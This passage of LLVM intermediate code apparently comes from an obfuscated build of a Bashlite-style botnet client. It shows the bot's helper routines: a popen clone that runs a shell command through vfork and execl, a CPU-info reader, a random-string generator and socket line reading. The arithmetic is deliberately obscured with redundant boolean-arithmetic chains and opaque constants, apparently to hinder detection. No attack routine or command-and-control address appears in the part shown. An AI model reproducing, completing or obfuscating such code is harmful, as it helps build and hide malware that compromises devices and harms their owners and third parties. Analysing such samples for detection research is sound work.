  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.20, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %69

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %67

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 %57, -1
  %59 = xor i32 65280, -1
  %60 = xor i32 271309213, -1
  %61 = or i32 %58, %59
  %62 = or i32 271309213, %60
  %63 = xor i32 %61, -1
  %64 = and i32 %63, %62
  %65 = and i32 %57, 65280
  %66 = ashr i32 %64, 8
  br label %67

; <label>:67:                                     ; preds = %53, %52
  %68 = phi i32 [ -1, %52 ], [ %66, %53 ]
  store i32 %68, i32* %2, align 4
  br label %69

; <label>:69:                                     ; preds = %67, %19
  %70 = load i32, i32* %2, align 4
  ret i32 %70
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %39

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, 1
  %37 = sub i32 %35, %36
  %38 = add nsw i32 %35, 1
  store i32 %37, i32* %8, align 4
  br label %9

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %39
  br label %45

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %4, align 8
  br label %45

; <label>:45:                                     ; preds = %43, %42
  %46 = phi i8* [ null, %42 ], [ %44, %43 ]
  ret i8* %46
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %39

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = xor i64 %16, -1
  %24 = xor i64 %22, -1
  %25 = xor i64 7649990496627408661, -1
  %26 = and i64 %23, 7649990496627408661
  %27 = and i64 %16, %25
  %28 = and i64 %24, 7649990496627408661
  %29 = and i64 %22, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 7649990496627408661, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %16, %22
  store i64 %37, i64* %3, align 8
  br label %4

; <label>:39:                                     ; preds = %12
  %40 = load i64, i64* %3, align 8
  ret i64 %40
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %79 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %52
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %116

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = or i1 %31, %33
  %35 = xor i1 %29, true
  br label %36

; <label>:36:                                     ; preds = %24, %19
  %37 = phi i1 [ false, %19 ], [ %34, %24 ]
  br label %38

; <label>:38:                                     ; preds = %36, %13
  %39 = phi i1 [ true, %13 ], [ %37, %36 ]
  %40 = xor i1 %39, true
  %41 = and i1 false, %40
  %42 = xor i1 false, true
  %43 = and i1 %39, %42
  %44 = xor i1 true, true
  %45 = and i1 %44, false
  %46 = and i1 true, %42
  %47 = or i1 %41, %43
  %48 = or i1 %45, %46
  %49 = xor i1 %47, %48
  %50 = xor i1 %39, true
  %51 = zext i1 %49 to i32
  store i32 %51, i32* %3, align 4
  br label %116

; <label>:52:                                     ; preds = %2
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %70

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  %62 = call i32 @wildString(i8* %59, i8* %61)
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  %65 = and i1 true, %64
  %66 = xor i1 true, true
  %67 = and i1 %63, %66
  %68 = or i1 %65, %67
  %69 = xor i1 %63, true
  br label %70

; <label>:70:                                     ; preds = %57, %52
  %71 = phi i1 [ false, %52 ], [ %68, %57 ]
  %72 = xor i1 %71, true
  %73 = and i1 true, %72
  %74 = xor i1 true, true
  %75 = and i1 %71, %74
  %76 = or i1 %73, %75
  %77 = xor i1 %71, true
  %78 = zext i1 %76 to i32
  store i32 %78, i32* %3, align 4
  br label %116

; <label>:79:                                     ; preds = %2
  %80 = load i8*, i8** %4, align 8
  %81 = load i8, i8* %80, align 1
  %82 = zext i8 %81 to i32
  %83 = call i32 @toupper(i32 %82) #10
  %84 = load i8*, i8** %5, align 8
  %85 = load i8, i8* %84, align 1
  %86 = zext i8 %85 to i32
  %87 = call i32 @toupper(i32 %86) #10
  %88 = icmp eq i32 %83, %87
  br i1 %88, label %89, label %107

; <label>:89:                                     ; preds = %79
  %90 = load i8*, i8** %4, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 1
  %92 = load i8*, i8** %5, align 8
  %93 = getelementptr inbounds i8, i8* %92, i64 1
  %94 = call i32 @wildString(i8* %91, i8* %93)
  %95 = icmp ne i32 %94, 0
  %96 = xor i1 %95, true
  %97 = and i1 false, %96
  %98 = xor i1 false, true
  %99 = and i1 %95, %98
  %100 = xor i1 true, true
  %101 = and i1 %100, false
  %102 = and i1 true, %98
  %103 = or i1 %97, %99
  %104 = or i1 %101, %102
  %105 = xor i1 %103, %104
  %106 = xor i1 %95, true
  br label %107

; <label>:107:                                    ; preds = %89, %79
  %108 = phi i1 [ false, %79 ], [ %105, %89 ]
  %109 = xor i1 %108, true
  %110 = and i1 true, %109
  %111 = xor i1 true, true
  %112 = and i1 %108, %111
  %113 = or i1 %110, %112
  %114 = xor i1 %108, true
  %115 = zext i1 %113 to i32
  store i32 %115, i32* %3, align 4
  br label %116

; <label>:116:                                    ; preds = %107, %70, %38, %9
  %117 = load i32, i32* %3, align 4
  ret i32 %117
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %90, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %92

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %90

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %68, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 0, 1
  %48 = add i64 %46, %47
  %49 = sub i64 %46, 1
  %50 = getelementptr inbounds i8, i8* %44, i64 %48
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 13
  br i1 %53, label %66, label %54

; <label>:54:                                     ; preds = %43
  %55 = load i8*, i8** %6, align 8
  %56 = load i8*, i8** %6, align 8
  %57 = call i64 @strlen(i8* %56) #10
  %58 = add i64 %57, 972467396366270665
  %59 = sub i64 %58, 1
  %60 = sub i64 %59, 972467396366270665
  %61 = sub i64 %57, 1
  %62 = getelementptr inbounds i8, i8* %55, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  br label %66

; <label>:66:                                     ; preds = %54, %43
  %67 = phi i1 [ true, %43 ], [ %65, %54 ]
  br i1 %67, label %68, label %77

; <label>:68:                                     ; preds = %66
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, -2980366518692464234
  %73 = sub i64 %72, 1
  %74 = add i64 %73, -2980366518692464234
  %75 = sub i64 %71, 1
  %76 = getelementptr inbounds i8, i8* %69, i64 %74
  store i8 0, i8* %76, align 1
  br label %43

; <label>:77:                                     ; preds = %66
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strchr(i8* %78, i32 46) #10
  %80 = icmp ne i8* %79, null
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %77
  %82 = load i8*, i8** %6, align 8
  %83 = call i8* @strchr(i8* %82, i32 46) #10
  store i8 0, i8* %83, align 1
  br label %84

; <label>:84:                                     ; preds = %81, %77
  %85 = load i8*, i8** %3, align 8
  %86 = load i8*, i8** %6, align 8
  %87 = call i8* @strcpy(i8* %85, i8* %86) #2
  %88 = load i32, i32* %4, align 4
  %89 = call i32 @close(i32 %88)
  store i32 0, i32* %2, align 4
  br label %95

; <label>:90:                                     ; preds = %13
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %91, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:92:                                     ; preds = %8
  %93 = load i32, i32* %4, align 4
  %94 = call i32 @close(i32 %93)
  store i32 1, i32* %2, align 4
  br label %95

; <label>:95:                                     ; preds = %92, %84
  %96 = load i32, i32* %2, align 4
  ret i32 %96
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %21, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %23

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %21

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  store i32 %19, i32* %1, align 4
  br label %21

; <label>:21:                                     ; preds = %16, %10
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:23:                                     ; preds = %5
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %23, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %30

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, %12
  %14 = sub i32 0, 65
  %15 = add i32 %13, %14
  %16 = sub i32 0, %15
  %17 = add i32 %12, 65
  %18 = trunc i32 %16 to i8
  %19 = load i8*, i8** %3, align 8
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 %18, i8* %22, align 1
  br label %23

; <label>:23:                                     ; preds = %10
  %24 = load i32, i32* %5, align 4
  %25 = sub i32 0, %24
  %26 = sub i32 0, 1
  %27 = add i32 %25, %26
  %28 = sub i32 0, %27
  %29 = add nsw i32 %24, 1
  store i32 %28, i32* %5, align 4
  br label %6

; <label>:30:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
